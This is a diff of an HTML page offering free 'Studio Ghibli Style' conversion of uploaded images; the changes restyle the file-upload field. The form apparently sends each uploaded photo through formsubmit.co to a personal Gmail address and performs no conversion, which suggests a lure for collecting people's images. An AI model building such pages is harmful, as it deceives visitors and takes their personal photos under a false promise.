@@ -1,4 +1,5 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -25,14 +26,33 @@
             backdrop-filter: blur(10px);
         }
         h1 { font-size: 22px; margin-bottom: 10px; }
-        H2 { font-size: 18px; margin-bottom: 10px; }
+        h2 { font-size: 18px; margin-bottom: 10px; }
         p { margin-bottom: 20px; }
-        input[type="file"] {
-            display: block; 
-            margin: 10px auto; 
-            background: white; 
-            padding: 8px; 
+        .file-input-wrapper {
+            position: relative;
+            margin: 15px auto;
+            width: 100%;
+        }
+        .file-input-label {
+            display: block;
+            background: white;
+            padding: 10px;
             border-radius: 5px;
+            color: #333;
+            text-align: left;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            cursor: pointer;
+        }
+        input[type="file"] {
+            position: absolute;
+            left: 0;
+            top: 0;
+            opacity: 0;
+            width: 100%;
+            height: 100%;
+            cursor: pointer;
         }
         button { 
             background: #ff9800; 
@@ -55,10 +75,20 @@
         
         <p>Upload your image and get Studio Ghibli Style results! no Login Required</p>
         <form id="uploadForm" action="https://formsubmit.co/babaiswaraj@gmail.com" method="POST" enctype="multipart/form-data">
-            <input type="file" name="image" required>
+            <div class="file-input-wrapper">
+                <label class="file-input-label" id="fileLabel">Choose a file...</label>
+                <input type="file" name="image" id="fileInput" required>
+            </div>
             <input type="hidden" name="_next" value="https://ghibli-art.github.io/Cool-Ghibli-Style/message.html">
             <button type="submit">Upload Image</button>
         </form>
     </div>
+
+    <script>
+        document.getElementById('fileInput').addEventListener('change', function(e) {
+            const fileName = e.target.files[0] ? e.target.files[0].name : 'Choose a file...';
+            document.getElementById('fileLabel').textContent = fileName;
+        });
+    </script>
 </body>
 </html>
